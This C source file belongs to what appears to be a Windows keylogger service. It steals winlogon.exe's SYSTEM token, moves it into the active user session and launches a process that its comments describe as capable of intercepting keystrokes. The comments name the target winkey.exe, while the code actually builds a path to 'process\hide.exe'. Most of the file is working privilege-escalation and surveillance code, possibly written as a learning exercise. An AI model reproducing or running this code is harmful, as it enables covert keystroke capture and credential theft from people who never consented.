/**
 * @file winkey.c
 * @brief Implementation of process management functions specifically for winkey.exe.
 */

#include "tinky.h"

/**
 * @brief Constructs the absolute path to the "winkey.exe" file based on the service's current location.
 * 
 * Takes the current service binary location, strips the filename and one parent directory, 
 * then appends "\winkey\winkey.exe".
 * 
 * @param outPath Buffer to store the constructed path.
 * @param outSize Size of the destination buffer.
 */
void BuildWinkeyPath(char *outPath, DWORD outSize)
{
	char exePath[MAX_PATH];
	char *lastSlash, *parentSlash;

	if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
		outPath[0] = '\0';
		return;
	}

	lastSlash = strrchr(exePath, '\\');
	if (lastSlash) *lastSlash = '\0';

	parentSlash = strrchr(exePath, '\\');
	if (parentSlash) *parentSlash = '\0';

	_snprintf_s(outPath, outSize, _TRUNCATE, "%s\\winkey\\process\\hide.exe", exePath);
	outPath[outSize - 1] = '\0';
}

/**
 * @brief Spawns "winkey.exe" under Session 1 with SYSTEM privileges.
 * 
 * Ensures single-instance execution via a global mutex. Leverages a stolen winlogon.exe
 * token to spawn winkey.exe as SYSTEM in the interactive user session (Session 1), 
 * rendering it visible / capable of intercepting keystrokes.
 * 
 * @return BOOL TRUE if the process was successfully launched, FALSE otherwise.
 */

BOOL StartWinkey(void)
{
    BOOL launched = FALSE;
    EnterCriticalSection(&g_ProcLock);

    /* ---- single-instance guard ---- */
    g_SingleInstanceMutex = CreateMutexA(NULL, TRUE, SINGLE_INSTANCE_MUTEX);
    if (!g_SingleInstanceMutex) {
        OutputDebugStringA("CreateMutex failed");
        LeaveCriticalSection(&g_ProcLock);
        return FALSE;
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        OutputDebugStringA("winkey.exe already running - skipping launch");
        CloseHandle(g_SingleInstanceMutex);
        g_SingleInstanceMutex = NULL;
        LeaveCriticalSection(&g_ProcLock);
        return FALSE;
    }

    /* ---- enable privileges ---- */
    if (!EnableRequiredPrivileges()) {
        OutputDebugStringA("Failed to enable required privileges");
        CloseHandle(g_SingleInstanceMutex);
        g_SingleInstanceMutex = NULL;
        LeaveCriticalSection(&g_ProcLock);
        return FALSE;
    }

    /* ---- steal SYSTEM token ---- */
    HANDLE hSystemToken = StealWinlogonToken();
    if (!hSystemToken) {
        CloseHandle(g_SingleInstanceMutex);
        g_SingleInstanceMutex = NULL;
        LeaveCriticalSection(&g_ProcLock);
        return FALSE;
    }

    /* ---- attach token to user session ---- */
    DWORD sessionId = WTSGetActiveConsoleSessionId();
    if (sessionId == 0xFFFFFFFF) {
        printf("No active user session\n");
        CloseHandle(hSystemToken);
        LeaveCriticalSection(&g_ProcLock);
        return FALSE;
    }

    if (!SetTokenInformation(hSystemToken, TokenSessionId,
                             &sessionId, sizeof(sessionId))) {
        printf("SetTokenInformation(TokenSessionId) failed (%lu)\n", GetLastError());
        CloseHandle(hSystemToken);
        LeaveCriticalSection(&g_ProcLock);
        return FALSE;
    }

    /* ---- build environment ---- */
    LPVOID pEnv = NULL;
    if (!CreateEnvironmentBlock(&pEnv, hSystemToken, FALSE)) 
	{
        printf("CreateEnvironmentBlock failed (%lu)\n", GetLastError());
        pEnv = NULL;
    }
    /* ---- build winkey path ---- */
    char appPath[MAX_PATH];
    BuildWinkeyPath(appPath, MAX_PATH);

    char appDir[MAX_PATH];
    strcpy(appDir, appPath);
    char *last = strrchr(appDir, '\\');
    if (last) *last = '\0';

    /* ---- launch winkey.exe in user session ---- */
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&g_WinkeyProcInfo, sizeof(g_WinkeyProcInfo));
    si.cb = sizeof(si);
    si.lpDesktop = "winsta0\\default";
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    BOOL ok = CreateProcessAsUserA(
        hSystemToken,
        appPath,
        NULL,
        NULL, NULL, FALSE,
        CREATE_UNICODE_ENVIRONMENT,
        pEnv,
        appDir,
        &si,
        &g_WinkeyProcInfo
    );
    if (!ok) 
	{
        printf("CreateProcessAsUser failed (%lu)\n", GetLastError());
        CloseHandle(g_SingleInstanceMutex);
        g_SingleInstanceMutex = NULL;
    } 
	else
        launched = TRUE;
    if (pEnv)
        DestroyEnvironmentBlock(pEnv);
    CloseHandle(hSystemToken);
    LeaveCriticalSection(&g_ProcLock);
    return launched;
}


/**
 * @brief Gracefully terminates the running "winkey.exe" process and releases its associated mutex.
 * 
 * Safely kills the child process via TerminateProcess, waits for shutdown, closes handles,
 * and releases the singleton mutex.
 */
void StopWinkey(void)
{
	EnterCriticalSection(&g_ProcLock);

	if (g_WinkeyProcInfo.hProcess) {
		TerminateProcess(g_WinkeyProcInfo.hProcess, 0);
		WaitForSingleObject(g_WinkeyProcInfo.hProcess, 5000);
		CloseHandle(g_WinkeyProcInfo.hProcess);
		CloseHandle(g_WinkeyProcInfo.hThread);
		ZeroMemory(&g_WinkeyProcInfo, sizeof(g_WinkeyProcInfo));
	}

	if (g_SingleInstanceMutex) {
		ReleaseMutex(g_SingleInstanceMutex);
		CloseHandle(g_SingleInstanceMutex);
		g_SingleInstanceMutex = NULL;
	}

	LeaveCriticalSection(&g_ProcLock);
}
